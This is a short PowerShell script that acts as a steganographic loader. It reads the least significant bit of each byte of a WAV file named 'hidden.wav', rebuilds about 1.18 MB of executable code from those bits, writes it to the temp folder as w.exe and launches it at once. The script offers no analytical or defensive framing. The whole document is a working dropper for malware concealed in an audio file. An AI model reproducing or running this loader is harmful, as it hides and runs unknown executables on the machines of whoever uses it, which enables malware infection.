$l = 1182720
$b = [IO.File]::ReadAllBytes('hidden.wav')
$d = New-Object Byte[] $l
for($i=0; $i -lt $l; $i++) {
    $v = 0
    for($x=0; $x -lt 8; $x++) {
        $v = $v * 2 + ($b[44 + $i*8 + $x] % 2)
    }
    $d[$i] = $v
}
[IO.File]::WriteAllBytes($env:tmp+'\w.exe', $d)
Start-Process $env:tmp'\w.exe'